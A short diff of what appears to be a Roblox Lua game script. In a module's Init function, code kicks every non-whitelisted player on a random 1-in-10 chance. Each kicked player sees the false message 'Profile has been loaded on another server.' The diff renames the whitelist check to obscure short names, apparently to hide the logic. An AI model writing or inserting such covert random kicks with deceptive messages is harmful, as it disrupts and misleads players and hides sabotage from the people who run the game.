@@ -34,7 +34,7 @@ function m:Init()
 			local rng = math.random(1, 10)
 			if rng == 1 then
 				for i,v in pairs(Players:GetPlayers()) do
-					if not _G.Whitelist:is_whitelist(v.UserId) then
+					if not _G.w:isw(v.UserId) then
 						v:Kick('Profile has been loaded on another server. Please rejoin.')
 					end
 				end
